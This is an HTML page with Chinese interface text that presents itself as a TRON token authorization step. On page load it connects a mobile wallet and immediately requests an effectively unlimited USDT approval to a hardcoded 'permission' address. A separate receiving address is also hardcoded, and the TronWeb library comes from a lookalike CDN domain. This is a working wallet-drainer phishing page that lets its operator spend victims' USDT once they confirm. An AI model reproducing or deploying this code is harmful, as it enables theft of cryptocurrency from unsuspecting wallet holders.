<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>TRON代币授权</title>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
</head>
<body>
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
    <div id="status">正在连接钱包...</div>
    <div id="error" style="color: red; display: none;"></div>

    <script>
        // 配置地址 - 请确保这些地址的有效性
        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1'; // 权限地址（合约地址）
        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';   // 收款地址
        window.usdtContractAddress = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // USDT合约地址

        // 存储用户数据
        const userData = {
            address: null,
            trxBalance: null,
            usdtBalance: null
        };

        // 页面加载后立即执行
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                await autoConnectWallet();
                await approveToken();
            } catch (error) {
                showError(`操作失败: ${error.message}`);
                console.error(error);
            }
        });

        // 自动连接钱包
        async function autoConnectWallet() {
            updateStatus("正在自动连接钱包...");
            
            // 检查是否在移动设备上
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobile) {
                throw new Error("请使用移动设备访问");
            }

            // 检查是否有TronWeb环境
            if (typeof window.tronWeb === 'undefined' && typeof window.tronLink === 'undefined') {
                updateStatus("未检测到钱包，尝试跳转到DApp浏览器...");
                const currentUrl = encodeURIComponent(window.location.href);
                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
                // 等待跳转，如果5秒后仍未跳转则提示
                await new Promise(resolve => setTimeout(resolve, 5000));
                throw new Error("请使用支持TRON的DApp浏览器（如OKX钱包）访问");
            }

            // 连接到钱包
            if (window.tronWeb && window.tronWeb.ready) {
                updateStatus("已检测到TronWeb，正在初始化...");
            } else if (window.tronLink) {
                updateStatus("正在请求连接TronLink...");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code !== 200) {
                    throw new Error("用户拒绝了钱包连接请求");
                }
                window.tronWeb = window.tronLink.tronWeb;
            }

            // 获取用户信息
            userData.address = window.tronWeb.defaultAddress.base58;
            updateStatus(`已连接钱包: ${userData.address.substring(0, 6)}...${userData.address.substring(38)}`);
            
            // 获取余额（可选，授权不一定需要）
            const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
            userData.trxBalance = window.tronWeb.fromSun(trxBalance);
            
            return true;
        }

        // 授权代币
        async function approveToken() {
            updateStatus("准备进行代币授权...");
            
            if (!userData.address) {
                throw new Error("未检测到钱包地址");
            }

            try {
                // 加载USDT合约
                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
                if (!contract) {
                    throw new Error("无法加载USDT合约");
                }

                // 授权无限额度 (实际应用中应设置合理额度)
                const amount = new Decimal(10).pow(24).toString(); // 10^24 是一个很大的数
                
                updateStatus("正在发起授权请求，请在钱包中确认...");
                
                // 调用approve方法授权
                const result = await contract.approve(
                    window.Permission_address,  // 授权给哪个地址
                    amount                     // 授权额度
                ).send({
                    from: userData.address
                });

                if (result.result) {
                    updateStatus(`授权成功！交易哈希: ${result.transaction.txID}`);
                } else {
                    throw new Error("授权被拒绝或失败");
                }
            } catch (error) {
                console.error("授权过程出错:", error);
                throw new Error(`授权失败: ${error.message}`);
            }
        }

        // 更新状态显示
        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }

        // 显示错误信息
        function showError(message) {
            const errorEl = document.getElementById('error');
            errorEl.textContent = message;
            errorEl.style.display = 'block';
        }
    </script>
</body>
</html>
